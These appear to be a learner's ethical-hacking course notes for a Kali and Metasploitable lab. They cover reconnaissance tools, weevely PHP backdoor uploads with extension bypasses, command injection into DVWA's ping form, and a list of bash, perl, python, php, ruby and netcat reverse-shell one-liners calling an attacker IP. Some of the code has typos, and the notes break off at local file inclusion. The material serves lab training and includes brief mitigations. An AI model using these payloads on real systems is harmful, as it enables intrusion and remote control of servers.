@@ -1,0 +1,2304 @@
+1) Lab Overview:
+a)  Enable Virtualization and install the following 
+b) Install VMware(VMware workstattion xx player)  - a software that is used to run different operating systems as Virtual machines 
+b) Install Kali Linux - OS designed for hacking . This will be the hacker machine : default username: root/toor 
+c) Metasploitable - it is a vulnerable linux distro, this OS contains a number of vulnerabilities designed for pentesters to try and hack it. 
+-> Metasploitable willbe one of the victims, that we will try to  hack. 
+-> We will use the Metasploitable as a target to learn how to hack into servers and hack into websites 
+-> default username: msfadmin/msfadmin 
+
+
+2) Kali Linux 
+● Linux distribution based on debian 
+● Made for hackers 
+● Contains most of the tools we need for this course 
+
+-> Only difference between Kali Linux and original debian distro is that Kali has lot of hacking and penetration testing tools pre-installed and pre-configured in it 
+-> Therefore once you install Kali, you will have access to so many hacking tools without the need to install or configure any of them- which saves a lot of time and effort  
+
+a) Installation options :
+-> Kali linux can be installed as a VM or as a main machine 
+-> Using virtual machine will not affect the main operating system 
+
+b) Download the virtual image of kali linux: https://zsecurity.org/download-custom-kali/
+-> This kali is custom kali image created by zsecurity, which is smoother and faster than the original one  
+-> It fixes number of bugs and contains number of extra programs needed for this course  
+
+
+#####Features of kali linux by zsecurity###############
+Added Features
+Enabled root login.
+
+Username: root
+Password: toor
+ 
+
+Improved wireless compatibility
+
+Atheros AR9271 drivers.
+Correct RTL8812AU drivers.
+Realtek RT5370 drivers.
+Improved Monitor mode, packet injection and AP mode support.
+ 
+
+GUI
+
+Gnome v 3.42
+Improved performance.
+Lighter theme.
+Lighter icons.
+Replaced guest additions x11 and dkms with less buggy versions.
+ 
+
+Bug fixes:
+
+Fixed netdiscover range issue.
+Fixed Zenmap discovery bugs.
+Fixed wash and reaver issues with RTL8812AU chipset.
+Fixed evilgrade update bug.
+Fixed bettercap hstshijack caplet issue.
+Added modified hstshijack caplet that works properly with HSTS websites.
+Fixed SSlStrip not downgrading HTTPS.
+ 
+
+Additional software:
+
+Terminator
+Leafpad
+Firefox
+Arpspoof
+Mdk3
+Mdk4
+Pip
+Pip3
+BeEF Framework
+Zaproxy
+Zenmap
+Latest working version of bettercap
+Linux Wifi Hotspot
+Mana toolkit
+Evilgrade
+Bdfproxy
+Knock
+
+################
+
+
+c) Before installing kali linux, we need to enable virtualization in the windows machine which we want to install  kali linux as a VM 
+
+d) Install VMware(VMware workstattion xx player) 
+
+e) After installing vm ware, we can run the kali linux os(which is downloaded from zsecurity )  in vmware
+
+f) In vmware -> File-> Open --> Then navigate to the location of kali linux which was downloaded 
+-> file extension is : .vmwarevm 
+-> Then after selecting the file, click open 
+
+g) Once the vm is opened, right click vm and edit settings -> change the following if needed:
+i) Memory; 2GB by default 
+ii) Processors: 2 by default 
+iii) Display settings : for screen resolution and graphics memory 
+iv) Network adapter : NAT 
+
+-> Important setting 
+-> This setting will create a virtual network where the host machine in which VMWare is installed - will act a router for this network 
+-> Thus all the VMs will be clients connected to this network 
+
+h) Thus all the VMs installed in this VMware will get the internet connection from the host machine and at the same time, all the VMs will be connected to the same virtual network 
+i) This is very useful because - 
+► virtual machines will be able to communicate with each other , 
+► use kali machine to hack into others 
+► can be used To test network attacks 
+
+j) Thus network adapter setting in VMWare -> Edit settings help:
+► VMs to have internet connection 
+► Helps VMs to communicate between each other 
+
+k) Virtual network formed will rely on the connection of your host computer 
+-> No extra interfaces are not extra adapters will be needed
+
+-> As fars are VMs are concerned, they will think that they are connected to an ethernet network, but in reality they are connected through the host machine 
+
+3) Metasploitable - it is a vulnerable linux distro, this OS contains a number of vulnerabilities designed for pentesters to try and hack it. 
+-> Metasploitable willbe one of the victims, that we will try to  hack. 
+
+a) Metasploitable download link: https://sourceforge.net/projects/metasploitable/
+b) Similar to the way, we had a windows machine to practice attacks that we can launch against normal users, we need to have another virtual machine that behaves like a server so that we can practice 
+server side attacks against it and see if we can hack into servers 
+c) The virtual machine that we are going to use is called Metasploitable which is a vm built on linux. It contains a number of services that is 
+typically used by servers 
+d) Metasploitable also contains number of web applications, which act like normal web application and 
+-> We will use the Metasploitable as a target to learn how to hack into servers and hack into websites 
+
+-> default username: msfadmin/msfadmin
+
+4) Basic overview of Kali Linux;
+a) In status bar -> we have applications menu and inside it you can see all the applicaitons that are present as part of kali linux. 
+-> Also these applications are categorised .
+b)Categories include 
+1) Information gathering 
+2) Vulnerability Analysis 
+3) Web application analysis 
+4) Database Assessment 
+5) Password attacks 
+6) Wireless Attacks
+7) Reverse engineering 
+8) Exploitation tools 
+9) Sniffing and Spoofing 
+10) Post Exploitation 
+11) Forensics 
+12) Reporting tools 
+13) Social Engineering Tools 
+14) System services 
+Usual Applications 
+Wine 
+
+
+b) Places menu - shows the most common places in the system like Home/Desktop/Documents/Downloads/Music/Pictures/Videos/Computer/Browse Network 
+c) Controls -> wireless/volume/charge
+
+d) WHile using Kali, we can only use external wireless usb adaptors to access wifi networks from Kali 
+-> You cannot use the built in wifi card , But kali should have internet connection anyway because it is configured to use a NAT network 
+
+
+
+5) Linux Terminal in Kali Linux: 
+a) pwd 
+-> current work directory 
+b) ls 
+-> list all files and directories in current working directory 
+c) cd 
+-> navigate into another directory 
+d) cd ..
+-> go back one directory 
+
+
+e) Linux commands list: 
+https://www.mediacollege.com/linux/command/linux-command.html
+
+f) man 
+-> manual of that command 
+
+eg:
+man ls 
+
+
+g) --help 
+
+eg: 
+ls --help 
+
+h) Linux related resource: https://explainshell.com/
+
+
+6) How to Install Programs in Kali linux from the terminal:
+a) First thing we should do: Update sources where Kali can search and download programs from 
+-> To do that, we use command:  
+apt-get update 
+
+-> This command asks to update all the programs that we are going to install 
+
+
+b) Now we can start installing applications 
+-> Here if want to install a program of name "terminator" 
+
+eg:
+apt-get install terminator 
+
+
+-> terminator is also a command line utitility to enter commands, one of the advantage it offers in addition is " it helps to split horizontally and vertically" 
+-> It also helps to split screens 
+
+
+7) Configuring Metasploitable & Lab Network Settings 
+a) Lab Setup 
+i) KALI LINUX Machine :  Hacker / Attacker machine 
+ii) METASPLOITABLE: Target or Victim 
+-> Metasploitable has a number websites installed on it 
+---> Like how webservers, have more than one website installed on the same web server 
+
+b) Accessing websites on Metasploitable 
+1) metasploitable login credentials: msfadmin/msfadmin
+2) To check ip address of Metasploitable machine: 
+use command: ifconfig 
+
+-> if ip address is : 10.20.14.214
+3) If we give : 10.20.14.214 in browser , we will be able to access metasploitable machine and it says metasploitable2 
+-> Here metasploitable2 is the webserver installed on the Metasploitable machine 
+-> On launching the ip in browser, it lists the following websites that are installed in the metasploitable
+
+TWiki
+phpMyAdmin
+Multillidae
+DVWA 
+WebDAV 
+
+
+
+c) In our metasploitable, Multillidae is misconfigured, so we are going to modify its configuration using nano text editor 
+d) Path for Multillidae config file is stored in /vara/www/multillidae/config.inc 
+-> to edit the file as admin use the command with sudo:  sudo nano /vara/www/multillidae/config.inc 
+-> change $dbname 
+
+Original:
+$dbhost='localhost';
+$dbuser= 'root';
+$dbpass='';
+$dbname = 'metasploit';
+
+Changed:
+$dbhost='localhost';
+$dbuser= 'root';
+$dbpass='';
+$dbname = 'owasp10';
+
+
+8) How does a normal computer becomes a webserver 
+a) By installing web server application, a normal computer becomes a webserver 
+-> Webserver is an application that you can install on any computer , which specifies a certain location within your file system 
+-> And in that location, you can host files so anybody connected in the network will be able to access the files stored in the web root  
+b) Webserver usually contain the web application files: 
+
+
+
+9) INFORMATION GATHERING:
+-> Information gathering is gathering as much information possible about the target 
+● IP address.
+● Domain name info.
+● Technologies used.
+● Other websites on the same server.
+● DNS records.
+● Unlisted files, sub-domains, directories.
+
+
+10) Whois Lookup
+a) 
+Whois Lookup - Find info about the owner of the target.
+→ http://whois.domaintools.com/
+2. Netcraft Site Report - Shows technologies used on the target.
+→ http://toolbar.netcraft.com/site_report?url=
+3. Robtex DNS lookup - Shows comprehensive info about the target website.
+→ https://www.robtex.com/
+
+
+b)
+ Whois Lookup - Find info about the owner of the target.
+→ http://whois.domaintools.com/
+
+-> It is a protocol that is used to find owners of internet resources eg: server , IP address or a domain
+
+ 
+-> If we enter domain name like: expeditors.com or hcl.in, 
+-> we will get lot of information about our targetted website 
+
+output for hcl.in in domain"
+
+#####
+Whois Record for HCL.in
+How does this work?
+
+ Domain Profile
+Registrar	Endurance Digital Domain Technology LLP
+IANA ID: 801217
+URL: https://publicdomainregistry.com/
+Whois Server: —
+
+(p)
+Registrar Status	clientTransferProhibited
+Dates	6,986 days old
+Created on 2005-02-16
+Expires on 2025-02-16
+Updated on 2023-12-25	  
+Name Servers	NS01.HCL.COM (has 93 domains)
+NS02.HCL.COM (has 93 domains)
+NS04.HCL.COM (has 93 domains)
+NS05.HCL.COM (has 93 domains)
+  
+IP Address	192.8.194.0 is hosted on a dedicated server
+  
+IP Location	India - Uttar Pradesh - Noida - Transferred From The Arin Region On 2015-02-16t15
+ASN	India AS24084 HCL-TECH-IN PLOT NO: 3A, SECTOR 126, SEZ, NOIDA, IN (registered Jul 15, 2011)
+Hosting History	1 change on 2 unique name servers over 7 years	  
+Whois Record ( last updated on 2024-04-04 )
+Domain Name: hcl.in
+Registry Domain ID: D518791-IN
+Registrar WHOIS Server:
+Registrar URL: https://publicdomainregistry.com/
+Updated Date: 2023-12-25T10:04:49Z
+Creation Date: 2005-02-16T07:01:25Z
+Registry Expiry Date: 2025-02-16T07:01:25Z
+Registrar: Endurance Digital Domain Technology LLP
+Registrar IANA ID: 801217
+Registrar Abuse Contact Email: 
+Registrar Abuse Contact Phone: +1.2013775952
+Domain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited
+Registry Registrant ID: REDACTED FOR PRIVACY
+Registrant Name: REDACTED FOR PRIVACY
+Registrant Organization: HCL Infosystems
+Registrant Street: REDACTED FOR PRIVACY
+Registrant Street: REDACTED FOR PRIVACY
+Registrant Street: REDACTED FOR PRIVACY
+Registrant City: REDACTED FOR PRIVACY
+Registrant State/Province: Uttar Pradesh
+Registrant Postal Code: REDACTED FOR PRIVACY
+Registrant Country: IN
+Registrant Phone: REDACTED FOR PRIVACY
+Registrant Phone Ext: REDACTED FOR PRIVACY
+################## 
+
+
+c) In the above data, 
+
+1) Created on 2005-02-16 -> This tells when the domain name was created 
+2) IP Address	192.8.194.0 is hosted on a dedicated server -> Tells the ip address of the domain: hcl.in 
+
+--> so if you ping hcl.in, we can see that it hits that ip 
+
+#####
+C:\Users\gs1-maheswarane>ping hcl.in
+
+Pinging hcl.in [192.8.194.0] with 32 bytes of data:
+Request timed out.
+
+#######
+
+3) Sometimes it shows Server Type, which tells details about the server 
+-> THis can be used to find the exploits 
+
+
+11) Discovering technologies used on the website 
+
+a) We can use netcraft for the same: 
+
+https://sitereport.netcraft.com/?url=http://www.ndtv.com
+
+b) Sample netcraft response for ndtv.com 
+
+############
+Background
+Site title	Get Latest News, India News, Breaking News, Today's News - NDTV.com
+Site rank	1192
+Description	NDTV.com provides latest news from India and around the world. Get breaking news alerts from India and follow today’s live news updates in field of politics, business, technology, Bollywood, cricket and more.
+Date first seen	November 1996
+Primary language	English
+Network
+Site	http://www.ndtv.com
+Netblock Owner	Akamai Technologies, Inc.
+Hosting company	Akamai Technologies
+Hosting country	 US
+IPv4 address	23.72.33.86 (VirusTotal)
+IPv4 autonomous systems	AS16625
+IPv6 address	2a02:26f0:db:29b:0:0:0:24e8
+IPv6 autonomous systems	AS20940
+Reverse DNS	a23-72-33-86.deploy.static.akamaitechnologies.com
+Domain	ndtv.com
+Nameserver	a1-18.akam.net
+Domain registrar	networksolutions.com
+Nameserver organisation	whois.markmonitor.com
+Organisation	5335 Gate Parkway care of Network Solutions PO Box 459, Jacksonville, 32256, US
+DNS admin	hostmaster@akamai.com
+Top Level Domain	Commercial entities (.com)
+DNS Security Extensions	Unknown
+IP delegation
+IPv4 address (23.72.33.86)
+IP range	Country	Name	Description
+::ffff:0.0.0.0/96	 United States	IANA-IPV4-MAPPED-ADDRESS	Internet Assigned Numbers Authority
+ ↳ 23.0.0.0-23.255.255.255	 United States	NET23	American Registry for Internet Numbers
+  ↳ 23.72.0.0-23.79.255.255	 United States	AKAMAI	Akamai Technologies, Inc.
+   ↳ 23.72.33.86	 United States	AKAMAI	Akamai Technologies, Inc.IPv6 address (2a02:26f0:db:29b:0:0:0:24e8)
+IP range	Country	Name	Description
+::/0	N/A	ROOT	Root inet6num object
+ ↳ 2a00::/11	 European Union	EU-ZZ-2A00	RIPE NCC
+  ↳ 2a00::/12	 Netherlands	EU-ZZ-2A00	RIPE Network Coordination Centre
+   ↳ 2a02:26f0::/29	 European Union	NL-AKAMAI-20101022	Akamai International B.V.
+    ↳ 2a02:26f0:db:29b:0:0:0:24e8	 European Union	NL-AKAMAI-20101022	Akamai International B.V.
+
+###########
+
+
+c) It gives information like :
+1) Site Title
+2) Description 
+3) website name :
+Site	http://www.ndtv.com 
+4) domain name :
+Domain	ndtv.com
+5) IP address 
+
+IPv4 address	23.72.33.86 (VirusTotal)
+
+6) Domain registrar:
+Domain registrar	networksolutions.com
+-> Domain registrar is the company who registered the domain for ndtv.com  
+
+
+7) 
+Hosting company	Akamai Technologies
+Hosting country	 US
+
+-> It tells the hosting company and hosting country 
+
+8) This tells the name server for the dns 
+
+Nameserver	a1-18.akam.net
+
+9) Web Trackers - Tells the third party resources or applications used on our target. 
+-> We can see that our target ndtv.com uses, google analytics, chartbeat etc  
+######
+Web Trackers are third-party resources loaded onto a webpage. Trackable resources include social sharing widgets, javascript files, and images. These trackers can be used to monitor individual user behaviour across the web. Data derived from these trackers are primarily used for advertising or analytics purposes.
+
+7 known trackers were identified.
+Companies
+Categories
+Company	Primary Category	Tracker	Popular Sites with this Tracker
+Chartbeat 	Analytics	Chartbeat	www.in.gr, www.aljazeera.net, www.ndtv.com
+ComScore 	Analytics	Scorecard Research	www.bbc.com, www.infobae.com, www.wunderground.com
+Google 	Analytics	Google Analytics	www.binance.com, www.ikea.com, www.interia.pl
+Googletagmanager	www.chess.com, www.wappalyzer.com, www.virustotal.com
+Widget	Googlewidget	www.majorgeeks.com, www.makeuseof.com, www.howtogeek.com
+Rubicon Project 	Advertising	Rubiconproject	www.dobreprogramy.pl, www.newsweek.com, www.dailymail.co.uk
+Taboola 	Advertising	Taboola	www.ynet.co.il, www.jeanmarcmorandini.com, www.tomsguide.com
+#######
+
+10) Site Technology 
+-> One of the most important sections as it shows the technologies used in the target website 
+
+
+We can use word press to find the exploit db: https://www.exploit-db.com/exploits/51966
+
+
+
+12) Gathering comprehensive DNS information: Robtex DNS lookup 
+
+a) Use website: https://www.robtex.com/
+
+-> Robtex is used for various kinds of research of IP numbers, Domain names, etc
+-> Robtex uses various sources to gather public information about IP numbers, domain names, host names, Autonomous systems, routes etc. It then indexes the data in a big database and provide free access to the data.
+-> Enter an IP address or hostname in the field above, and click "GO" to look up technical information. From the resulting page you can navigate further between the different tabs.
+
+b) What types of information does Robtex provide?
+-> Reverse DNS Lookup
+Search for an IP number and get which hostnames points to it. The reverse DNS records works not only for IP address, but also MX (mail server) records and NS (name server) records.
+-> Whois
+Make a whois lookup for a registered domain in various whois databases. There you can find contact information from the domain registration together with the registration date and expiration date.
+AS Macros.
+
+c) Analysis section 
+1) This section contains general information about the target 
+2) It gives information of the name servers of DNS, mail servers 
+3) It also gives information on IP address 
+4) In quick info, we can find the following:
+GQDN, Host Name, Domain name, TLD(Top level Domain), Registry, IP Numbers, Name Servers, Mail Servers 
+
+c) Reverse Section 
+-> This section performs reverse DNS lookup 
+-> While reverse DNS lookup helps to find domains with the help of IPs,
+-> Thus by reverse lookup we can find  the websites that are present in a server 
+---------> But using reverse lookup we wont get all websites installed on the server 
+
+
+d) History section:
+-> Helps to see all dns changes on the target website
+
+e) whois section:
+Whois Lookup - Find info about the owner of the target.
+
+f) DNSBL : DNS block , which is realtime block list
+-> It contains list of websites which were blocked by dns or considered as spam 
+
+
+13) Discovering Websites on the same server:
+-> One server can serve a number of websites 
+-> Gaining access to one can help gaining access to others 
+
+-> If you try to hack a website and could not find any exploits, we can check another website in the same server to check if there is any exploit 
+---> Exist on the same server, they will have the same IP address. 
+--> So if we are able to navigate into any website, we can navigate into other websites also using that 
+
+a) To find websites on the same server:
+1) Use Robtex DNS lookup under "names pointing to same IP"
+2) Use bing.com, search for ip: [target ip]
+
+-> go to bing.com and in search give this: 
+ip:192.0.78.25
+
+3) It will list all the websites that exist on the target server 
+
+
+14) Discovering subdomains:
+-> So far we have been gathering useful information about the target, always in the form of target.com such as google.com
+
+a) Here google.com is known as domain 
+-> We put the domain in the browser address bar to access the target website 
+
+b) subdomains:
+-> A lot of websites also have subdomains 
+-> Subdomains are the names that you see before the domain name 
+
+► Subdomain.target.com 
+eg: mail.google.com 
+
+e) if we go to : google.com we go to search page  ---> This url has only domain in it. 
+   if we go to: mail.google.com, it goes to gmail page --> this url has subdomain and domain 
+   
+f) So if our target is : target.com, eg: google.com 
+-> It is very important to discover all the subdomains on it, because these subdomains can give us a lot of other information 
+like : 
+► Sensitive data
+► management pages of admin/members 
+► access completely different web applications 
+► access beta version of the web application  
+► or parts of web application that is still under development 
+
+g) Tools to discover subdomain:
+Knock
+Sublist3r
+DNSDumpster
+Altdns
+Amass
+Subfinder
+Censys
+Dnsrecon
+SubBrute
+Aquatone
+Findomain
+Google Dorking
+Pentest-Tools.com
+SecurityTrails, LLC
+SubDomainizer
+Assetfinder
+Bufferover
+Chaos
+Netcraft
+Nmmapper
+VirusTotal
+Waybackurls
+
+
+h) https://github.com/guelfoweb/knock
+-> Knockpy is a portable and modular python3 tool designed to quickly enumerate subdomains on a target domain through passive reconnaissance and dictionary scan.
+
+Usage of knockpy : knockpy targetdomain 
+
+eg:
+root@kali:~# knockpy google.com 
+
+the output will  list all the Ip addresses and the related subdomains 
+
+
+
+15) Discovering Sensitive files : in webserver 
+So far we learnt how to find subdomains that exist within our target website and that have not been listed in netcraft site 
+
+a) In this lesson we will see, how we can find files and directories that are stored on our target computer or on our target website  
+-> This could be useful because these files could contain passwords, config information or they could contain information about these actual servers
+
+
+b) In a webserver, webserver related files are stored in : /var/www 
+
+if a file exists in server as: /var/www/multillidae/index.php then we can access in browser as: 10.20.14.204/multillidae/index.php 
+
+-> Here ip address hides /var/www and anything after that will be displayed after the ip address
+
+c) To access the hidden files in webserver, we will use a tool called dirb
+
+d) To get help on using dirb tool: 
+man dirb   
+
+
+e) We can find that the syntax for dirb is: 
+
+dirb <url_base> <url_base> [<wordlist_file(s)] [options]
+
+f) How dirb works:
+-> It uses bruteforce attack and uses word list of names  and sends requests with these names  
+-> Anytime it finds something, it outputs the file with that name. 
+-> It will be able to find names and directories based on the wordlist you provide 
+-> Or you can use wordlist that come with it  
+
+eg:
+root@kali:#dirb http://10.20.24.204/multillidae/
+
+
+-> On hitting the command, it uses a wordlist file  which is stored in :/usr/share/dirb/wordlists/common.txt 
+
+
+if we want to specify a file for wordlist we can specify like this:
+
+eg:
+root@kali:#dirb http://10.20.14.204/multillidae/ /root/wordlist.txt  
+
+
+
+16) Maltego - Discovering Servers, Domains and Files 
+a) Maltego is an information gathering tool that can be used to collect information abut anything 
+-> it is present only in kali linux 
+b) To run maltego type the following in terminal
+
+
+> maltegoce 
+
+
+c) First time we run the program, it will ask to create username/password for the program 
+-> We can also add some additional plugins or progams 
+-> These programs helps to gather different kinds of information 
+
+17) Maltego - discovering websites, host provider and Emails 
+
+18) File Upload Vulnerabilities:
+a) Simplest type of vulnerabilities because they allow us to upload any type of file 
+b) If the target computer can understand PHP, then we can upload any PHP file or  a php shell and get full control over the target computer 
+c) If the target computer understands Python or any other language, then you can just upload Python code, Python shell or Ruby shell 
+d) We can create these shells using an anvil evasion or metasploit or we can use our own php or python shell 
+e) In this lesson we will use a tool called Weevly which generates php shells and allows us to gain access and do many cool things on the target computer 
+
+f) weevely - a tool which is used to create a php payload 
+
+######UPLOADING A PHP SHELL OR BACKDOOR, EG: WEEVLY########
+Upload a php shell or backdoor, ex: weevly
+1. Generate backdoor > weevly generate [passord] [file name]
+2. Upload generated file.
+3. Connect to it > weevly [url to file] [password]
+4. Find out how to use weevly > help
+###########################################################
+
+g) weevely usage: 
+
+Step 1) Generate backdoor
+weevely generate password placeto_store 
+
+-> Here we put password so that only we can access it and control the website when we upload it to the website 
+
+
+eg:
+root@kali:~#weevely generate 123456 /root/shell.php 
+
+-> So here weevely is the name of the program
+-> generate is to generate a shell 
+-> 123456 is the password so thaat once we can access it and control it 
+-> /root/shell.php  -> place where the shell program will be stored 
+
+
+Step 2) Upload the generated shell file from the application, where we can upload the file 
+
+Step 3) We will use same link: and use weevely again to interact with the shell that we uploaded 
+
+
+1) Earlier uploaded files were stored here: 10.20.14.204/dvwa/hackable/uploads/image.jpg 
+
+2) First lets see if the shell still exists and if it was uploaded properly by entering the below url: 10.20.14.204/dvwa/hackable/uploads/shell.php 
+
+3) When we hit the url and if we get blank page and not a 404 page means, file has been uploaded and it is there. 
+
+4) Now lets interact with the shell through weevely 
+
+root@kali:~weevely http://10.20.14.204/dvwa/hackable/uploads/shell.php 123456 
+
+-> This is similar to using our multihandler waiting for connections to your backdoor 
+
+5) So here we are going to connect th backdoor that we uploaded 
+
+
+################
+root@kali:~weevely http://10.20.14.204/dvwa/hackable/uploads/shell.php 123456 
+
+[+] weevely 3.2.0 
+
+[+] Target:  10.20.14.204
+[+] Session: /root/.weevely/sessions/10.20.14.204/shell_0.session 
+
+[+] Browse the filesystem or execute commands starts the connection 
+[+] to the target. Type : help for more information 
+
+weevely> 
+
+
+################
+-> Now we are in file system of target computer and from this place we can type in any linux command and it will get executed in the target computer 
+
+
+
+h) Weevely also offers much more features than this 
+-> It helps to do a number of things, if you type in help :
+
+features include 
+ESCALATING PRIVILEGES 
+EXECUTE SQL QUERIES 
+and many more 
+
+
+19) GET and POST requests/Intercepting requests ;
+
+20) Exploiting Advanced File upload vulnerabilities to hack websites 
+a) rename the file from shell.php to shell2.jpg since our application does not allow php upload 
+-> In burpsuite proxy->intercept -> change from filename="shell2.jpg" to shell2.php" 
+---> then forward the request and we can see in ui that the file is successfully uploaded 
+b) Then we can go to terminal, try connecting and see if it works 
+---> We will use the same command that we used earlier :
+
+root@kali~# weevely http://10.20.14.209/dvwa/hackable/uploads/shell2.php 123456
+
+c) Upon hitting the command, we are able to connect to target server through weevely
+
+-> Thus by changing the extension, we are able to exploit file upload vulnerability 
+
+21) Exploiting more advanced File Upload vulnerabilities: 
+
+a) Resources for file upload vulnerability:
+
+https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/File-Upload-test.txt
+https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+
+a) So far we managed to upload php files using easy and medium difficulties. Now lets try the high difficulty file upload vulnerabilities, which is more advanced 
+b) Use the DVWA application which was present in metasploitable
+c) Like last example for medium , if we rename the file name from .jpg to .php, the application is able to detect that it is a php file and hence prevents the upload 
+d) Now if we rename the file from shell.jpg to shell3.php.jpg , file got uploaded successfully
+e) Now go to terminal and communicate with this file :
+
+
+root@kali~# weevely http://10.20.14.209/dvwa/hackable/uploads/shell3.php.jpg 123456
+
+weevely> 
+
+
+-> Thus entering the command lets us log in to weevely, and we are able to execute commands and get remote control over the target web server 
+
+22) SECURING YOUR WEBSITE FROM FILE UPLOAD VULNERABILITIES:
+
+a) Never allow users to upload executables(php, exec.. etc) 
+b) Check the file type and the file extension 
+c) Analyse the uploaded file itself, recreate it and rename it. 
+d) do some checks like:
+-> check for file type 
+-> check for file size 
+-> RECREATE THE IMAGE: strip any metadata if needed and recreate file or image using  some tool like  php-Imagick 
+---> delete old image and use new image with a new name 
+
+
+23) Code Execution Vulnerabilities
+a) Allows an attacker to execute OS commands on the target server 
+-> Windows or linux commands 
+-> in linux based systems, we can use ; to execute multiple commands 
+b) Can be used to get a reverse shell 
+c) Upload any file using wget command 
+d) Reverse shell execution:
+
+###########
+a) Following examples assumes that hacker ip is : 10.20.14.203 and using port 8080 for the connection 
+b) Therefore in all these cases, you need to listen to port 8080 using the following command 
+
+...........
+netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP.
+Netcat is just a tool that allows you to listen and connect computers together. 
+...........
+
+Step i) Listening in port 8080 from attacker machine 
+##netcat#
+nc -vv -l -p 8080 
+###
+-> Here -vv is verbose 
+-> -l means listening on particular port 
+--> In attacker machine we will type this command:and listen on port 8080 
+
+eg:
+root@kali:~# nc -vv -l -p 8080
+listening on[any] 8080 .. 
+
+Step ii) Try to connect from webserver back to my computer using netcat 
+
+nc -ef /bin/sh 10.20.14.203 8080 
+
+-> Here 10.20.14.203 is attacker machine 
+-> Here we give 8080 which is the port we give for listening in command: nc -vv -l -p 8080 
+
+Step iii) IN DVWA program for ping: 
+
+10.20.14.203; nc -ef /bin/sh 10.20.14.203 8080 
+
+-> This command execution will try to connect from the webserver back to the attacker machine 
+
+
+Step iv) Upon hitting ping from DVWA program:
+
+root@kali:~#nc -vv -l -p 8080 
+listening on [any] 8080 ...
+10.20.14.204: inverse host lookup failed: Unknow host 
+connect to [10.20.14.203] from (UNKNOWN)[10.20.14.204] 39194 
+
+Step v) Now at this stage we can execute all the shell commands, which gets executed on the remote computer i.e the webserver 
+
+
+
+c) Bash:
+-> This should work on most unix systems
+####
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 
+####
+
+d) PERL:
+
+######
+perl -e 'user Socket;$i="10.20.14.203"; $p=8080;socket(S,PF_INET, SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, ">&S");open(STDOUT, ">&S");open(STDERR, ">&S");exec("/bin/sh -i");};'
+######
+
+e) PYTHON
+
+##########
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("10.20.14.203",8080));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); osdup2(s.fileno(),2);p=subprocess.call[["/bin/sh","-i"]);'
+##########
+
+f)PHP
+
+##########
+php -r '$sock=fsockopen("10.20.14.203",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+##########
+
+g) Ruby 
+ruby -rsocket -e'f=TCPSocket.open("10.20.14.203", 8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+h) Netcat:
+nc -ef /bin/sh 10.20.14.203 8080 
+
+
+########
+
+
+
+
+26) Exploiting Advanced code execution vulnerabilities:
+a) In our DVWA application, if we put ip: 10.20.14.208 which is the ip of kali machine - attacker, then we will get ping output 
+b)  But if we put like this : 10.20.14.208:pwd , we wont get any output because of the security implemented 
+c) While ; does not work, we can use pipe(|) 
+
+-> What pipe does it : run the first command and once you run the command , send the output to the next command and run the second command with it
+-> Thus it runs two commands  
+
+d) Running multiple commands by using ;
+
+##############
+eg:
+[mahesh@GS1-MAHESWAR-LX ~]$ ls ; pwd
+db2jcc-4.19.26.jar  help  jars
+/home/mahesh
+##############
+
+e) Running multiple commands using | 
+-> Here output of first command is not getting displayed but still the output of second command gets displayed 
+-> Here results of pwd gets displayed 
+
+##############
+[mahesh@GS1-MAHESWAR-LX ~]$ ls | pwd
+/home/mahesh
+[mahesh@GS1-MAHESWAR-LX ~]$
+##############
+
+
+f) Now if we try using | in DVWA application: ping 10.20.14.208 | pwd 
+-> We will get pwd output getting printed in the output 
+
+
+
+27) MITIGATING CODE EXECUTION VULNERABILITIES:
+a) Avoid any feature/code which allows user to run any sort of command code on your server 
+-> Try to avoid functions such as eval, PASSTHRU and all those functions that allow a user  to run operating system code on the server 
+
+The PASSTHRU function evaluates an expression and executes the resulting character string as a database statement, returning a result set.
+
+b) In case we need a functionality which needs to run some sort of command on your server, we need to make sure to analyse the input before you execute it  
+-> Analyse the input and filter the same 
+
+
+
+28) Local File Inclusion Vulnerabilities:(LFI)
+a) Allows an attacker to ready any file on the same server 
+-> Helps to Access files even if it is outside www directory 
+b) This vulnerability is critical because, you can ready any files 
+c) Also if there are number of websites on the same server , this vulnerability will be handy
+d) We will be exploiting this vulnerability through the url .
+
+eg: http://10.20.14.204/dvwa/vulnerabilities/exec/?ip=10.20.14.203;pwd 
+
+29) Gaining Shell access from LFI vulnerabilities - Method 1 
+-> It will be great if we are able to get full access to the target server, using LFI vulnerabilities
+-> In this lesson, we will see how we can get a reverse shell by exploiting local file inclusion vulnerability 
+
+a) Because LFI allows us to ready files on the server, if we manage to write anything on that server - then we can write some malicious code and then browse it and get that code to be executed. 
+b) There are a number of methods to achieve this, but usually it is done using the log files. 
+-> Because the log files usually register or write stuff
+
+c) TRY TO INJECT INTO READABLE FILES 
+eg:
+● /proc/self/environ
+● /var/log/auth.log 
+● /var/log/apache2/access.log 
+
+d) First method: EXPLOIT THE ENVIRON variable 
+1)  environ is a file that contains an array of information about the current environment 
+
+eg:
+#####################
